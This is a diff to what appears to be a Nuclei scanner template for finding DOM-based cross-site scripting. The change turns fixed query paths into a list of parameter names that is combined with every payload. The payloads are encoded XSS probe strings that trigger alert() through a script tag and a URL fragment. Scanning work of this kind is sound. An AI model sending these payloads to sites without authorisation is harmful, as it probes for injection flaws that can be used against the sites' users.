@@ -13,16 +13,19 @@ variables:
 http:
   - method: GET
     path:
-      - "{{BaseURL}}?q={{payload}}"
-      - "{{BaseURL}}?search={{payload}}"
-      - "{{BaseURL}}?param={{payload}}"
-      - "{{BaseURL}}?query={{payload}}"
-      - "{{BaseURL}}?keyword={{payload}}"
-      - "{{BaseURL}}?input={{payload}}"
-      - "{{BaseURL}}?name={{payload}}"
-      - "{{BaseURL}}?id={{payload}}"
+      - "{{BaseURL}}?{{param}}={{payload}}"
 
     payloads:
+      param:
+        - "q"
+        - "search"
+        - "param"
+        - "query"
+        - "keyword"
+        - "input"
+        - "name"
+        - "id"
+
       payload:
         # Basic DOM XSS with fragment
         - '<script%20id=name></script>#alert({{random}});//'
@@ -56,6 +59,7 @@ http:
         - '<script%20id=%22name%22></script>#alert({{random}});//'
         - '<script%20id=&#x6e;ame></script>#alert({{random}});//'
 
+    attack: clusterbomb
     stop-at-first-match: true
 
     matchers-condition: or
